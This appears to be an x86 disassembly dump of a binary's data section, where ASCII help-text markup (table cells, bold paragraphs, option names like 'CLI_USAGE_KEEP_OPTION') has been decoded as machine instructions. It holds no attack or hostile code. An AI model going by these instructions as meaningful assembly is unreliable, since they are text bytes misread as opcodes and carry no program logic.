1100b093:	addr16 jb 0x1100b0f7
1100b096:	jo     0x1100b100
1100b098:	and    BYTE PTR [esi+0x6f],al
1100b09b:	jb     0x1100b102
1100b09d:	addr16 jb 0x1100b10f
1100b0a0:	jne    0x1100b110
1100b0a2:	fs cmp eax,0x756c4222
1100b0a8:	and    bh,BYTE PTR gs:[esi]
1100b0ab:	inc    ebx
1100b0ac:	dec    esp
1100b0ad:	dec    ecx
1100b0ae:	pop    edi
1100b0af:	push   ebp
1100b0b0:	push   ebx
1100b0b1:	inc    ecx
1100b0b2:	inc    edi
1100b0b3:	inc    ebp
1100b0b4:	pop    edi
1100b0b5:	dec    ebx
1100b0b6:	inc    ebp
1100b0b7:	inc    ebp
1100b0b8:	push   eax
1100b0b9:	pop    edi
1100b0ba:	dec    edi
1100b0bb:	push   eax
1100b0bc:	push   esp
1100b0bd:	dec    ecx
1100b0be:	dec    edi
1100b0bf:	dec    esi
1100b0c0:	cmp    al,0x2f
1100b0c2:	push   eax
1100b0c3:	popa   
1100b0c4:	jb     0x1100b127
1100b0c6:	addr16 jb 0x1100b12a
1100b0c9:	jo     0x1100b133
1100b0cb:	ds or  eax,0x2020200a
1100b0d1:	and    BYTE PTR [eax],ah
1100b0d3:	and    BYTE PTR [eax],ah
1100b0d5:	and    BYTE PTR [edi+ebp*1],bh
1100b0d8:	push   esp
1100b0d9:	popa   
1100b0da:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b0de:	gs ins BYTE PTR es:[edi],dx
1100b0e0:	ins    BYTE PTR es:[edi],dx
1100b0e1:	ds or  eax,0x2020200a
1100b0e7:	and    BYTE PTR [eax],ah
1100b0e9:	and    BYTE PTR [eax],ah
1100b0eb:	and    BYTE PTR [esp+edx*2],bh
1100b0ee:	popa   
1100b0ef:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b0f3:	gs ins BYTE PTR es:[edi],dx
1100b0f5:	ins    BYTE PTR es:[edi],dx
1100b0f6:	ds or  eax,0x2020200a
1100b0fc:	and    BYTE PTR [eax],ah
1100b0fe:	and    BYTE PTR [eax],ah
1100b100:	and    BYTE PTR [eax],ah
1100b102:	and    BYTE PTR [eax+edx*2],bh
1100b105:	popa   
1100b106:	jb     0x1100b169
1100b108:	addr16 jb 0x1100b16c
1100b10b:	jo     0x1100b175
1100b10d:	ds inc ebx
1100b10f:	dec    esp
1100b110:	dec    ecx
1100b111:	pop    edi
1100b112:	push   ebp
1100b113:	push   ebx
1100b114:	inc    ecx
1100b115:	inc    edi
1100b116:	inc    ebp
1100b117:	pop    edi
1100b118:	dec    ebx
1100b119:	inc    ebp
1100b11a:	inc    ebp
1100b11b:	push   eax
1100b11c:	pop    edi
1100b11d:	dec    edi
1100b11e:	push   eax
1100b11f:	push   esp
1100b120:	dec    ecx
1100b121:	dec    edi
1100b122:	dec    esi
1100b123:	pop    edi
1100b124:	inc    esp
1100b125:	inc    ebp
1100b126:	push   ebx
1100b127:	inc    ebx
1100b128:	cmp    al,0x2f
1100b12a:	push   eax
1100b12b:	popa   
1100b12c:	jb     0x1100b18f
1100b12e:	addr16 jb 0x1100b192
1100b131:	jo     0x1100b19b
1100b133:	ds or  eax,0x2020200a
1100b139:	and    BYTE PTR [eax],ah
1100b13b:	and    BYTE PTR [eax],ah
1100b13d:	and    BYTE PTR [edi+ebp*1],bh
1100b140:	push   esp
1100b141:	popa   
1100b142:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b146:	gs ins BYTE PTR es:[edi],dx
1100b148:	ins    BYTE PTR es:[edi],dx
1100b149:	ds or  eax,0x2020200a
1100b14f:	and    BYTE PTR [eax],ah
1100b151:	and    BYTE PTR [edi+ebp*1],bh
1100b154:	push   esp
1100b155:	popa   
1100b156:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b15a:	outs   dx,DWORD PTR ds:[esi]
1100b15b:	ja     0x1100b19b
1100b15d:	or     eax,0x2020200a
1100b162:	and    BYTE PTR [eax],ah
1100b164:	and    BYTE PTR ds:0x2020200a,cl
1100b16a:	and    BYTE PTR [eax],ah
1100b16c:	and    BYTE PTR [esp+edx*2],bh
1100b16f:	popa   
1100b170:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b174:	outs   dx,DWORD PTR ds:[esi]
1100b175:	ja     0x1100b1b5
1100b177:	or     eax,0x2020200a
1100b17c:	and    BYTE PTR [eax],ah
1100b17e:	and    BYTE PTR [eax],ah
1100b180:	and    BYTE PTR [esp+edx*2],bh
1100b183:	popa   
1100b184:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b188:	gs ins BYTE PTR es:[edi],dx
1100b18a:	ins    BYTE PTR es:[edi],dx
1100b18b:	and    BYTE PTR [ebx+0x6f],al
1100b18e:	ins    BYTE PTR es:[edi],dx
1100b18f:	jne    0x1100b1fe
1100b191:	outs   dx,BYTE PTR ds:[esi]
1100b192:	push   ebx
1100b193:	jo     0x1100b1f6
1100b195:	outs   dx,BYTE PTR ds:[esi]
1100b196:	cmp    eax,0x3e223222
1100b19b:	or     eax,0x2020200a
1100b1a0:	and    BYTE PTR [eax],ah
1100b1a2:	and    BYTE PTR [eax],ah
1100b1a4:	and    BYTE PTR [edi+ebp*1],bh
1100b1a7:	push   esp
1100b1a8:	popa   
1100b1a9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b1ad:	gs ins BYTE PTR es:[edi],dx
1100b1af:	ins    BYTE PTR es:[edi],dx
1100b1b0:	ds or  eax,0x2020200a
1100b1b6:	and    BYTE PTR [eax],ah
1100b1b8:	and    BYTE PTR [edi+ebp*1],bh
1100b1bb:	push   esp
1100b1bc:	popa   
1100b1bd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b1c1:	outs   dx,DWORD PTR ds:[esi]
1100b1c2:	ja     0x1100b202
1100b1c4:	or     eax,0x200a0d0a
1100b1c9:	and    BYTE PTR [eax],ah
1100b1cb:	and    BYTE PTR [edi+ebp*1],bh
1100b1ce:	push   esp
1100b1cf:	popa   
1100b1d0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b1d4:	outs   dx,DWORD PTR ds:[esi]
1100b1d5:	ja     0x1100b21e
1100b1d7:	jb     0x1100b248
1100b1d9:	jne    0x1100b24b
1100b1db:	ds or  eax,0x200a0d0a
1100b1e1:	and    BYTE PTR [eax],ah
1100b1e3:	and    BYTE PTR [esp+edx*2],bh
1100b1e6:	popa   
1100b1e7:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b1eb:	outs   dx,DWORD PTR ds:[esi]
1100b1ec:	ja     0x1100b235
1100b1ee:	jb     0x1100b25f
1100b1f0:	jne    0x1100b262
1100b1f2:	and    BYTE PTR [ebx+0x74],dl
1100b1f5:	jns    0x1100b263
1100b1f7:	gs cmp eax,0x74537b22
1100b1fd:	popa   
1100b1fe:	je     0x1100b269
1100b200:	arpl   WORD PTR [edx+0x65],dx
1100b203:	jae    0x1100b274
1100b205:	jne    0x1100b279
1100b207:	arpl   WORD PTR [ebp+0x20],sp
1100b20a:	push   0x65646165
1100b20f:	jb     0x1100b257
1100b211:	outs   dx,DWORD PTR ds:[esi]
1100b212:	outs   dx,DWORD PTR ds:[esi]
1100b213:	je     0x1100b27a
1100b215:	jb     0x1100b269
1100b217:	outs   dx,DWORD PTR ds:[esi]
1100b218:	ja     0x1100b26d
1100b21a:	je     0x1100b295
1100b21c:	ins    BYTE PTR es:[edi],dx
1100b21d:	gs jge 0x1100b242
1100b220:	ds or  eax,0x2020200a
1100b226:	and    BYTE PTR [eax],ah
1100b228:	and    BYTE PTR [esp+edx*2],bh
1100b22b:	popa   
1100b22c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b230:	outs   dx,DWORD PTR ds:[esi]
1100b231:	ja     0x1100b271
1100b233:	or     eax,0x2020200a
1100b238:	and    BYTE PTR [eax],ah
1100b23a:	and    BYTE PTR [eax],ah
1100b23c:	and    BYTE PTR [esp+edx*2],bh
1100b23f:	popa   
1100b240:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b244:	gs ins BYTE PTR es:[edi],dx
1100b246:	ins    BYTE PTR es:[edi],dx
1100b247:	and    BYTE PTR [ebx+0x6f],al
1100b24a:	ins    BYTE PTR es:[edi],dx
1100b24b:	jne    0x1100b2ba
1100b24d:	outs   dx,BYTE PTR ds:[esi]
1100b24e:	push   ebx
1100b24f:	jo     0x1100b2b2
1100b251:	outs   dx,BYTE PTR ds:[esi]
1100b252:	cmp    eax,0x3e223222
1100b257:	or     eax,0x2020200a
1100b25c:	and    BYTE PTR [eax],ah
1100b25e:	and    BYTE PTR [eax],ah
1100b260:	and    BYTE PTR [eax],ah
1100b262:	and    BYTE PTR [eax+edx*2],bh
1100b265:	popa   
1100b266:	jb     0x1100b2c9
1100b268:	addr16 jb 0x1100b2cc
1100b26b:	jo     0x1100b2d5
1100b26d:	ds inc ebx
1100b26f:	dec    esp
1100b270:	dec    ecx
1100b271:	pop    edi
1100b272:	push   ebp
1100b273:	push   ebx
1100b274:	inc    ecx
1100b275:	inc    edi
1100b276:	inc    ebp
1100b277:	pop    edi
1100b278:	inc    ebp
1100b279:	pop    eax
1100b27a:	push   esp
1100b27b:	pop    edi
1100b27c:	push   edx
1100b27d:	inc    ebp
1100b27e:	dec    esi
1100b27f:	inc    ecx
1100b280:	dec    ebp
1100b281:	dec    ecx
1100b282:	dec    esi
1100b283:	inc    edi
1100b284:	pop    edi
1100b285:	push   eax
1100b286:	push   edx
1100b287:	dec    edi
1100b288:	pop    edi
1100b289:	dec    edi
1100b28a:	push   eax
1100b28b:	push   esp
1100b28c:	dec    ecx
1100b28d:	dec    edi
1100b28e:	dec    esi
1100b28f:	push   ebx
1100b290:	cmp    al,0x2f
1100b292:	push   eax
1100b293:	popa   
1100b294:	jb     0x1100b2f7
1100b296:	addr16 jb 0x1100b2fa
1100b299:	jo     0x1100b303
1100b29b:	ds or  eax,0x2020200a
1100b2a1:	and    BYTE PTR [eax],ah
1100b2a3:	and    BYTE PTR [eax],ah
1100b2a5:	and    BYTE PTR [edi+ebp*1],bh
1100b2a8:	push   esp
1100b2a9:	popa   
1100b2aa:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b2ae:	gs ins BYTE PTR es:[edi],dx
1100b2b0:	ins    BYTE PTR es:[edi],dx
1100b2b1:	ds or  eax,0x2020200a
1100b2b7:	and    BYTE PTR [eax],ah
1100b2b9:	and    BYTE PTR [edi+ebp*1],bh
1100b2bc:	push   esp
1100b2bd:	popa   
1100b2be:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b2c2:	outs   dx,DWORD PTR ds:[esi]
1100b2c3:	ja     0x1100b303
1100b2c5:	or     eax,0x2020200a
1100b2ca:	and    BYTE PTR [edi+ebp*1],bh
1100b2cd:	push   esp
1100b2ce:	popa   
1100b2cf:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b2d3:	outs   dx,DWORD PTR ds:[esi]
1100b2d4:	ja     0x1100b31d
1100b2d6:	jb     0x1100b347
1100b2d8:	jne    0x1100b34a
1100b2da:	ds or  eax,0x200a0d0a
1100b2e0:	and    BYTE PTR [eax],ah
1100b2e2:	and    BYTE PTR [esp+edx*2],bh
1100b2e5:	popa   
1100b2e6:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b2ea:	outs   dx,DWORD PTR ds:[esi]
1100b2eb:	ja     0x1100b334
1100b2ed:	jb     0x1100b35e
1100b2ef:	jne    0x1100b361
1100b2f1:	and    BYTE PTR [ebx+0x74],dl
1100b2f4:	jns    0x1100b362
1100b2f6:	gs cmp eax,0x74537b22
1100b2fc:	popa   
1100b2fd:	je     0x1100b368
1100b2ff:	arpl   WORD PTR [edx+0x65],dx
1100b302:	jae    0x1100b373
1100b304:	jne    0x1100b378
1100b306:	arpl   WORD PTR [ebp+0x20],sp
1100b309:	fs popa 
1100b30b:	je     0x1100b36e
1100b30d:	push   edx
1100b30e:	outs   dx,DWORD PTR ds:[esi]
1100b30f:	ja     0x1100b364
1100b311:	je     0x1100b38c
1100b313:	ins    BYTE PTR es:[edi],dx
1100b314:	gs jge 0x1100b339
1100b317:	ds or  eax,0x2020200a
1100b31d:	and    BYTE PTR [eax],ah
1100b31f:	and    BYTE PTR [esp+edx*2],bh
1100b322:	popa   
1100b323:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b327:	outs   dx,DWORD PTR ds:[esi]
1100b328:	ja     0x1100b368
1100b32a:	or     eax,0x2020200a
1100b32f:	and    BYTE PTR [eax],ah
1100b331:	and    BYTE PTR [eax],ah
1100b333:	and    BYTE PTR [esp+edx*2],bh
1100b336:	popa   
1100b337:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b33b:	gs ins BYTE PTR es:[edi],dx
1100b33d:	ins    BYTE PTR es:[edi],dx
1100b33e:	ds or  eax,0x2020200a
1100b344:	and    BYTE PTR [eax],ah
1100b346:	and    BYTE PTR [eax],ah
1100b348:	and    BYTE PTR [eax],ah
1100b34a:	and    BYTE PTR [eax+edx*2],bh
1100b34d:	popa   
1100b34e:	jb     0x1100b3b1
1100b350:	addr16 jb 0x1100b3b4
1100b353:	jo     0x1100b3bd
1100b355:	and    BYTE PTR [esi+0x6f],al
1100b358:	jb     0x1100b3bf
1100b35a:	addr16 jb 0x1100b3cc
1100b35d:	jne    0x1100b3cd
1100b35f:	fs cmp eax,0x756c4222
1100b365:	and    bh,BYTE PTR gs:[esi]
1100b368:	inc    ebx
1100b369:	dec    esp
1100b36a:	dec    ecx
1100b36b:	pop    edi
1100b36c:	push   ebp
1100b36d:	push   ebx
1100b36e:	inc    ecx
1100b36f:	inc    edi
1100b370:	inc    ebp
1100b371:	pop    edi
1100b372:	dec    esi
1100b373:	inc    ecx
1100b374:	dec    ebp
1100b375:	dec    ecx
1100b376:	dec    esi
1100b377:	inc    edi
1100b378:	pop    edi
1100b379:	dec    edi
1100b37a:	push   eax
1100b37b:	push   esp
1100b37c:	dec    ecx
1100b37d:	dec    edi
1100b37e:	dec    esi
1100b37f:	cmp    al,0x2f
1100b381:	push   eax
1100b382:	popa   
1100b383:	jb     0x1100b3e6
1100b385:	addr16 jb 0x1100b3e9
1100b388:	jo     0x1100b3f2
1100b38a:	ds or  eax,0x2020200a
1100b390:	and    BYTE PTR [eax],ah
1100b392:	and    BYTE PTR [eax],ah
1100b394:	and    BYTE PTR [edi+ebp*1],bh
1100b397:	push   esp
1100b398:	popa   
1100b399:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b39d:	gs ins BYTE PTR es:[edi],dx
1100b39f:	ins    BYTE PTR es:[edi],dx
1100b3a0:	ds or  eax,0x2020200a
1100b3a6:	and    BYTE PTR [eax],ah
1100b3a8:	and    BYTE PTR [eax],ah
1100b3aa:	and    BYTE PTR [esp+edx*2],bh
1100b3ad:	popa   
1100b3ae:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b3b2:	gs ins BYTE PTR es:[edi],dx
1100b3b4:	ins    BYTE PTR es:[edi],dx
1100b3b5:	ds or  eax,0x2020200a
1100b3bb:	and    BYTE PTR [eax],ah
1100b3bd:	and    BYTE PTR [eax],ah
1100b3bf:	and    BYTE PTR [eax],ah
1100b3c1:	and    BYTE PTR [eax+edx*2],bh
1100b3c4:	popa   
1100b3c5:	jb     0x1100b428
1100b3c7:	addr16 jb 0x1100b42b
1100b3ca:	jo     0x1100b434
1100b3cc:	ds inc ebx
1100b3ce:	dec    esp
1100b3cf:	dec    ecx
1100b3d0:	pop    edi
1100b3d1:	push   ebp
1100b3d2:	push   ebx
1100b3d3:	inc    ecx
1100b3d4:	inc    edi
1100b3d5:	inc    ebp
1100b3d6:	pop    edi
1100b3d7:	dec    esi
1100b3d8:	inc    ecx
1100b3d9:	dec    ebp
1100b3da:	dec    ecx
1100b3db:	dec    esi
1100b3dc:	inc    edi
1100b3dd:	pop    edi
1100b3de:	dec    edi
1100b3df:	push   eax
1100b3e0:	push   esp
1100b3e1:	dec    ecx
1100b3e2:	dec    edi
1100b3e3:	dec    esi
1100b3e4:	pop    edi
1100b3e5:	inc    esp
1100b3e6:	inc    ebp
1100b3e7:	push   ebx
1100b3e8:	inc    ebx
1100b3e9:	cmp    al,0x2f
1100b3eb:	push   eax
1100b3ec:	popa   
1100b3ed:	jb     0x1100b450
1100b3ef:	addr16 jb 0x1100b453
1100b3f2:	jo     0x1100b45c
1100b3f4:	ds or  eax,0x2020200a
1100b3fa:	and    BYTE PTR [eax],ah
1100b3fc:	and    BYTE PTR [eax],ah
1100b3fe:	and    BYTE PTR [edi+ebp*1],bh
1100b401:	push   esp
1100b402:	popa   
1100b403:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b407:	gs ins BYTE PTR es:[edi],dx
1100b409:	ins    BYTE PTR es:[edi],dx
1100b40a:	ds or  eax,0x2020200a
1100b410:	and    BYTE PTR [eax],ah
1100b412:	and    BYTE PTR [edi+ebp*1],bh
1100b415:	push   esp
1100b416:	popa   
1100b417:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b41b:	outs   dx,DWORD PTR ds:[esi]
1100b41c:	ja     0x1100b45c
1100b41e:	or     eax,0x200a0d0a
1100b423:	and    BYTE PTR [eax],ah
1100b425:	and    BYTE PTR [eax],ah
1100b427:	and    BYTE PTR [esp+edx*2],bh
1100b42a:	popa   
1100b42b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b42f:	outs   dx,DWORD PTR ds:[esi]
1100b430:	ja     0x1100b470
1100b432:	or     eax,0x2020200a
1100b437:	and    BYTE PTR [eax],ah
1100b439:	and    BYTE PTR [eax],ah
1100b43b:	and    BYTE PTR [esp+edx*2],bh
1100b43e:	popa   
1100b43f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b443:	gs ins BYTE PTR es:[edi],dx
1100b445:	ins    BYTE PTR es:[edi],dx
1100b446:	ds or  eax,0x2020200a
1100b44c:	and    BYTE PTR [eax],ah
1100b44e:	and    BYTE PTR [eax],ah
1100b450:	and    BYTE PTR [eax],ah
1100b452:	and    BYTE PTR [eax+edx*2],bh
1100b455:	popa   
1100b456:	jb     0x1100b4b9
1100b458:	addr16 jb 0x1100b4bc
1100b45b:	jo     0x1100b4c5
1100b45d:	and    BYTE PTR [esi+0x6f],al
1100b460:	jb     0x1100b4c7
1100b462:	addr16 jb 0x1100b4d4
1100b465:	jne    0x1100b4d5
1100b467:	fs cmp eax,0x756c4222
1100b46d:	and    bh,BYTE PTR gs:[esi]
1100b470:	inc    ebx
1100b471:	dec    esp
1100b472:	dec    ecx
1100b473:	pop    edi
1100b474:	push   ebp
1100b475:	push   ebx
1100b476:	inc    ecx
1100b477:	inc    edi
1100b478:	inc    ebp
1100b479:	pop    edi
1100b47a:	push   eax
1100b47b:	push   edx
1100b47c:	inc    ebp
1100b47d:	inc    esi
1100b47e:	dec    ecx
1100b47f:	pop    eax
1100b480:	pop    edi
1100b481:	dec    edi
1100b482:	push   eax
1100b483:	push   esp
1100b484:	dec    ecx
1100b485:	dec    edi
1100b486:	dec    esi
1100b487:	cmp    al,0x2f
1100b489:	push   eax
1100b48a:	popa   
1100b48b:	jb     0x1100b4ee
1100b48d:	addr16 jb 0x1100b4f1
1100b490:	jo     0x1100b4fa
1100b492:	ds or  eax,0x2020200a
1100b498:	and    BYTE PTR [eax],ah
1100b49a:	and    BYTE PTR [eax],ah
1100b49c:	and    BYTE PTR [edi+ebp*1],bh
1100b49f:	push   esp
1100b4a0:	popa   
1100b4a1:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b4a5:	gs ins BYTE PTR es:[edi],dx
1100b4a7:	ins    BYTE PTR es:[edi],dx
1100b4a8:	ds or  eax,0x2020200a
1100b4ae:	and    BYTE PTR [eax],ah
1100b4b0:	and    BYTE PTR [eax],ah
1100b4b2:	and    BYTE PTR [esp+edx*2],bh
1100b4b5:	popa   
1100b4b6:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b4ba:	gs ins BYTE PTR es:[edi],dx
1100b4bc:	ins    BYTE PTR es:[edi],dx
1100b4bd:	ds or  eax,0x2020200a
1100b4c3:	and    BYTE PTR [eax],ah
1100b4c5:	and    BYTE PTR [eax],ah
1100b4c7:	and    BYTE PTR [eax],ah
1100b4c9:	and    BYTE PTR [eax+edx*2],bh
1100b4cc:	popa   
1100b4cd:	jb     0x1100b530
1100b4cf:	addr16 jb 0x1100b533
1100b4d2:	jo     0x1100b53c
1100b4d4:	ds inc ebx
1100b4d6:	dec    esp
1100b4d7:	dec    ecx
1100b4d8:	pop    edi
1100b4d9:	push   ebp
1100b4da:	push   ebx
1100b4db:	inc    ecx
1100b4dc:	inc    edi
1100b4dd:	inc    ebp
1100b4de:	pop    edi
1100b4df:	push   eax
1100b4e0:	push   edx
1100b4e1:	inc    ebp
1100b4e2:	inc    esi
1100b4e3:	dec    ecx
1100b4e4:	pop    eax
1100b4e5:	pop    edi
1100b4e6:	dec    edi
1100b4e7:	push   eax
1100b4e8:	push   esp
1100b4e9:	dec    ecx
1100b4ea:	dec    edi
1100b4eb:	dec    esi
1100b4ec:	pop    edi
1100b4ed:	inc    esp
1100b4ee:	inc    ebp
1100b4ef:	push   ebx
1100b4f0:	inc    ebx
1100b4f1:	cmp    al,0x2f
1100b4f3:	push   eax
1100b4f4:	popa   
1100b4f5:	jb     0x1100b558
1100b4f7:	addr16 jb 0x1100b55b
1100b4fa:	jo     0x1100b564
1100b4fc:	ds or  eax,0x2020200a
1100b502:	and    BYTE PTR [eax],ah
1100b504:	and    BYTE PTR [eax],ah
1100b506:	and    BYTE PTR [edi+ebp*1],bh
1100b509:	push   esp
1100b50a:	popa   
1100b50b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b50f:	gs ins BYTE PTR es:[edi],dx
1100b511:	ins    BYTE PTR es:[edi],dx
1100b512:	ds or  eax,0x2020200a
1100b518:	and    BYTE PTR [eax],ah
1100b51a:	and    BYTE PTR [edi+ebp*1],bh
1100b51d:	push   esp
1100b51e:	popa   
1100b51f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b523:	outs   dx,DWORD PTR ds:[esi]
1100b524:	ja     0x1100b564
1100b526:	or     eax,0x200a0d0a
1100b52b:	and    BYTE PTR [eax],ah
1100b52d:	and    BYTE PTR [eax],ah
1100b52f:	and    BYTE PTR [esp+edx*2],bh
1100b532:	popa   
1100b533:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b537:	outs   dx,DWORD PTR ds:[esi]
1100b538:	ja     0x1100b578
1100b53a:	or     eax,0x2020200a
1100b53f:	and    BYTE PTR [eax],ah
1100b541:	and    BYTE PTR [eax],ah
1100b543:	and    BYTE PTR [esp+edx*2],bh
1100b546:	popa   
1100b547:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b54b:	gs ins BYTE PTR es:[edi],dx
1100b54d:	ins    BYTE PTR es:[edi],dx
1100b54e:	ds or  eax,0x2020200a
1100b554:	and    BYTE PTR [eax],ah
1100b556:	and    BYTE PTR [eax],ah
1100b558:	and    BYTE PTR [eax],ah
1100b55a:	and    BYTE PTR [eax+edx*2],bh
1100b55d:	popa   
1100b55e:	jb     0x1100b5c1
1100b560:	addr16 jb 0x1100b5c4
1100b563:	jo     0x1100b5cd
1100b565:	and    BYTE PTR [esi+0x6f],al
1100b568:	jb     0x1100b5cf
1100b56a:	addr16 jb 0x1100b5dc
1100b56d:	jne    0x1100b5dd
1100b56f:	fs cmp eax,0x756c4222
1100b575:	and    bh,BYTE PTR gs:[esi]
1100b578:	inc    ebx
1100b579:	dec    esp
1100b57a:	dec    ecx
1100b57b:	pop    edi
1100b57c:	push   ebp
1100b57d:	push   ebx
1100b57e:	inc    ecx
1100b57f:	inc    edi
1100b580:	inc    ebp
1100b581:	pop    edi
1100b582:	dec    ebp
1100b583:	inc    ecx
1100b584:	push   eax
1100b585:	dec    ecx
1100b586:	dec    esi
1100b587:	pop    edi
1100b588:	dec    edi
1100b589:	push   eax
1100b58a:	push   esp
1100b58b:	dec    ecx
1100b58c:	dec    edi
1100b58d:	dec    esi
1100b58e:	cmp    al,0x2f
1100b590:	push   eax
1100b591:	popa   
1100b592:	jb     0x1100b5f5
1100b594:	addr16 jb 0x1100b5f8
1100b597:	jo     0x1100b601
1100b599:	ds or  eax,0x2020200a
1100b59f:	and    BYTE PTR [eax],ah
1100b5a1:	and    BYTE PTR [eax],ah
1100b5a3:	and    BYTE PTR [edi+ebp*1],bh
1100b5a6:	push   esp
1100b5a7:	popa   
1100b5a8:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b5ac:	gs ins BYTE PTR es:[edi],dx
1100b5ae:	ins    BYTE PTR es:[edi],dx
1100b5af:	ds or  eax,0x2020200a
1100b5b5:	and    BYTE PTR [eax],ah
1100b5b7:	and    BYTE PTR [eax],ah
1100b5b9:	and    BYTE PTR [esp+edx*2],bh
1100b5bc:	popa   
1100b5bd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b5c1:	gs ins BYTE PTR es:[edi],dx
1100b5c3:	ins    BYTE PTR es:[edi],dx
1100b5c4:	ds or  eax,0x2020200a
1100b5ca:	and    BYTE PTR [eax],ah
1100b5cc:	and    BYTE PTR [eax],ah
1100b5ce:	and    BYTE PTR [eax],ah
1100b5d0:	and    BYTE PTR [eax+edx*2],bh
1100b5d3:	popa   
1100b5d4:	jb     0x1100b637
1100b5d6:	addr16 jb 0x1100b63a
1100b5d9:	jo     0x1100b643
1100b5db:	ds inc ebx
1100b5dd:	dec    esp
1100b5de:	dec    ecx
1100b5df:	pop    edi
1100b5e0:	push   ebp
1100b5e1:	push   ebx
1100b5e2:	inc    ecx
1100b5e3:	inc    edi
1100b5e4:	inc    ebp
1100b5e5:	pop    edi
1100b5e6:	dec    ebp
1100b5e7:	inc    ecx
1100b5e8:	push   eax
1100b5e9:	dec    ecx
1100b5ea:	dec    esi
1100b5eb:	pop    edi
1100b5ec:	dec    edi
1100b5ed:	push   eax
1100b5ee:	push   esp
1100b5ef:	dec    ecx
1100b5f0:	dec    edi
1100b5f1:	dec    esi
1100b5f2:	pop    edi
1100b5f3:	inc    esp
1100b5f4:	inc    ebp
1100b5f5:	push   ebx
1100b5f6:	inc    ebx
1100b5f7:	cmp    al,0x2f
1100b5f9:	push   eax
1100b5fa:	popa   
1100b5fb:	jb     0x1100b65e
1100b5fd:	addr16 jb 0x1100b661
1100b600:	jo     0x1100b66a
1100b602:	ds or  eax,0x2020200a
1100b608:	and    BYTE PTR [eax],ah
1100b60a:	and    BYTE PTR [eax],ah
1100b60c:	and    BYTE PTR [edi+ebp*1],bh
1100b60f:	push   esp
1100b610:	popa   
1100b611:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b615:	gs ins BYTE PTR es:[edi],dx
1100b617:	ins    BYTE PTR es:[edi],dx
1100b618:	ds or  eax,0x2020200a
1100b61e:	and    BYTE PTR [eax],ah
1100b620:	and    BYTE PTR [edi+ebp*1],bh
1100b623:	push   esp
1100b624:	popa   
1100b625:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b629:	outs   dx,DWORD PTR ds:[esi]
1100b62a:	ja     0x1100b66a
1100b62c:	or     eax,0x200a0d0a
1100b631:	and    BYTE PTR [eax],ah
1100b633:	and    BYTE PTR [eax],ah
1100b635:	and    BYTE PTR [esp+edx*2],bh
1100b638:	popa   
1100b639:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100b63d:	outs   dx,DWORD PTR ds:[esi]
1100b63e:	ja     0x1100b67e
1100b640:	or     eax,0x2020200a
1100b645:	and    BYTE PTR [eax],ah
1100b647:	and    BYTE PTR [eax],ah
1100b649:	and    BYTE PTR [esp+edx*2],bh
1100b64c:	popa   
1100b64d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100b651:	gs ins BYTE PTR es:[edi],dx
1100b653:	ins    BYTE PTR es:[edi],dx
1100b654:	ds or  eax,0x2020200a
1100b65a:	and    BYTE PTR [eax],ah
1100b65c:	and    BYTE PTR [eax],ah
1100b65e:	and    BYTE PTR [eax],ah
1100b660:	and    BYTE PTR [eax+edx*2],bh
1100b663:	popa   
1100b664:	jb     0x1100b6c7
1100b666:	addr16 jb 0x1100b6ca
1100b669:	jo     0x1100b6d3
1100b66b:	and    BYTE PTR [esi+0x6f],al
1100b66e:	jb     0x1100b6d5
1100b670:	addr16 jb 0x1100b6e2
1100b673:	jne    0x1100b6e3
1100b675:	fs cmp eax,0x756c4222
1100b67b:	and    bh,BYTE PTR gs:[esi]
1100b67e:	inc    ebx
1100b67f:	dec    esp
1100b680:	dec    ecx
1100b681:	pop    edi
1100b682:	push   ebp
1100b683:	push   ebx
1100b684:	inc    ecx
1100b685:	inc    edi
1100b686:	inc    ebp
1100b687:	pop    edi
1100b688:	inc    ebp
1100b689:	dec    esi
1100b68a:	dec    eax
1100b68b:	inc    ecx
1100b68c:	dec    esi
1100b68d:	inc    ebx
1100b68e:	inc    ebp
1100b68f:	inc    esp
1100b690:	dec    edi
1100b691:	dec    ecx
1100b692:	pop    edi
1100b693:	dec    edi
1100b694:	push   eax
1100b695:	push   esp
1100b696:	dec    ecx
1100b697:	dec    edi
1100b698:	dec    esi
1100b699:	cmp    al,0x2f
1100b69b:	push   eax
1100b69c:	popa   
1100b69d:	jb     0x1100b700
1100b69f:	addr16 jb 0x1100b703
1100b6a2:	jo     0x1100b70c
1100b6a4:	ds or  eax,0x2020200a
1100b6aa:	and    BYTE PTR [eax],ah
